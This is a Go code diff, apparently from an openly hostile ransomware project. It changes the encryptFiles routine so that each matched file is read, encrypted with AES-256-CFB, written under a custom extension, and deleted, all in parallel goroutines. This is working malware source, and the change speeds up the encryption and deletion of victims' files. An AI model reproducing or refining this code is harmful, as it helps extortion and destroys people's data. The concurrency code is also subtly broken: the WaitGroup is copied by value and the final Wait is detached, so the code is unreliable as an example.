@@ -8,6 +8,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"sync"
 	"time"
 
 	"github.com/mauri870/cryptofile/crypto"
@@ -96,41 +97,53 @@ func encryptFiles() {
 		})
 	}
 
+	// Setup a wait group so we can process all files
+	var wg sync.WaitGroup
+
+	// Set the number of goroutines we need to wait for while
+	// they process the individual files.
+	wg.Add(len(MatchedFiles))
+
 	// Loop over the matched files
+	// Launch a goroutine for each file.
 	for _, file := range MatchedFiles {
 		log.Printf("Encrypting %s...\n", file.Path)
 
-		// Read the file content
-		text, err := ioutil.ReadFile(file.Path)
-		if err != nil {
-			// In case of error, continue to the next file
-			log.Println(err)
-			continue
-		}
+		go func(file File, waitGroup sync.WaitGroup) {
+			// Read the file content
+			text, err := ioutil.ReadFile(file.Path)
+			if err != nil {
+				// In case of error, continue to the next file
+				log.Println(err)
+			}
 
-		// Encrypting using AES-256-CFB
-		ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
-		if err != nil {
-			// In case of error, continue to the next file
-			log.Println(err)
-			continue
-		}
+			// Encrypting using AES-256-CFB
+			ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
+			if err != nil {
+				log.Println(err)
+			}
 
-		// Write a new file with the encrypted content followed by the custom extension
-		err = ioutil.WriteFile(file.Path+EncryptionExtension, ciphertext, 0600)
-		if err != nil {
-			// In case of error, continue to the next file
-			log.Println(err)
-			continue
-		}
+			// Write a new file with the encrypted content followed by the custom extension
+			err = ioutil.WriteFile(file.Path+EncryptionExtension, ciphertext, 0600)
+			if err != nil {
+				log.Println(err)
+			}
 
-		// Remove the original file
-		err = os.Remove(file.Path)
-		if err != nil {
-			// In case of error, continue to the next file
-			log.Println("Cannot delete original file, skipping...")
-		}
+			// Remove the original file
+			err = os.Remove(file.Path)
+			if err != nil {
+				// In case of error, continue to the next file
+				log.Println("Cannot delete original file, skipping...")
+			}
+
+			wg.Done()
+		}(file, wg)
 	}
+
+	go func() {
+		// Wait for everything to be processed.
+		wg.Wait()
+	}()
 
 	if len(MatchedFiles) > 0 {
 		message := `
